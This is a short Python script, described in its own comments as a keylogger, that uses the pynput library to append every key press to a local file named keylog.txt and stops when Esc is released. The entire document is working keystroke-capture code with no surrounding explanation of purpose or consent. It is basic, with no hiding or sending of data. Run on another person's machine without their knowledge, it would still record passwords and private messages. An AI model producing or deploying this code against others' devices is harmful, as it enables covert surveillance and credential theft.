from pynput.keyboard import Key, Listener

# Function to write key presses to a log file
def on_press(key):
    with open("keylog.txt", "a") as f:
        f.write(f"{key}\n")

# Function to stop the keylogger
def on_release(key):
    if key == Key.esc:
        return False

# Start listening for key events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()